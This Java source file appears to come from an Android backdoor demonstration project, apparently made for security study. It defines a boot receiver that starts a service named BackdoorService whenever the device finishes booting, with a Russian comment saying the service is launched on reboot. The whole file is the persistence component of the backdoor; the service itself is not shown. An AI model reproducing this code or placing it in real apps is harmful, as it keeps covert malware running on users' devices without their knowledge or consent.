package ru.security.simplebackdoorexample;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {

    private static final String ACTION = "android.intent.action.BOOT_COMPLETED";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(ACTION)) {
            // При перезагрузке запускаем сервис
            Intent pushIntent = new Intent(context, BackdoorService.class);
            context.startService(pushIntent);
        }
    }

}
